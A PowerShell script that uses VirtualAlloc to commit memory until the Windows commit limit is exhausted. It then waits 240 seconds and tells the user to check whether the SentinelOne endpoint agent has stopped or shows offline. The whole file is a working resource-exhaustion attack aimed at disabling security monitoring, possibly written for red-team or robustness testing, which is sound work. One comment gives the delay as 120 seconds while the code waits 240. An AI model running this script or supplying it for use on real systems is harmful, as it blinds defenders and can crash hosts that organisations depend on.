# Define VirtualAlloc and constants for memory allocation
$signature = @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool VirtualFree(IntPtr lpAddress, ulong dwSize, uint dwFreeType);
"@

Add-Type -MemberDefinition $signature -Namespace "MemoryAllocation" -Name "NativeMethods"

# Constants for VirtualAlloc
$MEM_COMMIT = 0x1000
$PAGE_READWRITE = 0x04
$MEM_RELEASE = 0x8000

# Function to get committed memory (including both physical RAM and virtual memory)
function Get-CommittedMemory {
    $counter = Get-Counter '\Memory\Committed Bytes'
    return $counter.CounterSamples.CookedValue  # Returns committed bytes
}

# Memory Consumption Function using VirtualAlloc to consume all available memory
function Consume-AllMemory {
    $memoryBlockSize = 1024 * 1024 * 1024 # Start with 1 GB blocks
    $minSize = 64 * 1024 * 1024  # Minimum size of 64 MB (to avoid tiny allocations)
    $maxAttempts = 200
    $attempts = 0
    $allocList = @()  # Store allocated memory to prevent freeing
    $totalAllocated = 0

    while ($true) {
        # Get current committed memory
        $committedMemory = Get-CommittedMemory
        Write-Host "Committed memory: $($committedMemory / 1GB) GB"

        # Get system commit limit (total amount of memory, including pagefile, that can be committed)
        $commitLimit = (Get-Counter '\Memory\Commit Limit').CounterSamples.CookedValue
        $remainingCommit = $commitLimit - $committedMemory

        Write-Host "Remaining commit memory: $($remainingCommit / 1GB) GB"

        # If we can no longer allocate any memory, stop (but allow smaller blocks if possible)
        if ($remainingCommit -lt $memoryBlockSize) {
            if ($remainingCommit -ge $minSize) {
                Write-Host "Switching to smaller block size."
                $memoryBlockSize = $minSize
            } else {
                Write-Host "Stopping memory consumption, system resources depleted."
                break
            }
        }

        try {
            # Try allocating large chunks of memory using VirtualAlloc
            $memoryBlock = [MemoryAllocation.NativeMethods]::VirtualAlloc([IntPtr]::Zero, $memoryBlockSize, $MEM_COMMIT, $PAGE_READWRITE)
            if ($memoryBlock -eq [IntPtr]::Zero) {
                throw "Allocation failed"
            }
            $allocList += $memoryBlock  # Keep a reference to prevent freeing
            $totalAllocated += $memoryBlockSize
            Write-Host "Allocated $memoryBlockSize bytes of memory. Total allocated: $totalAllocated bytes."
        } catch {
            Write-Host "Memory allocation failed for size: $memoryBlockSize bytes"
            if ($memoryBlockSize -eq $minSize) {
                $attempts++
                if ($attempts -ge $maxAttempts) {
                    Write-Host "Reached maximum number of allocation attempts. Exiting..."
                    break
                }
                Start-Sleep -Milliseconds 100  # Introduce sleep delay after repeated failures
            } else {
                Write-Host "Reducing allocation size..."
                $memoryBlockSize = [math]::floor($memoryBlockSize / 2)
            }
        }
    }
}

# Main Execution Logic

# Step 1: Consume all available memory
Write-Host "Consuming all system memory..."
Consume-AllMemory

# Step 2: Add a delay to give time for SentinelOne to react (120 seconds)
Write-Host "Sleeping for 240 seconds to allow S1 to react to memory consumption..."
Start-Sleep -Seconds 240

Write-Host "Check if SentinelAgent has stopped or GUI shows offline. Script completed."
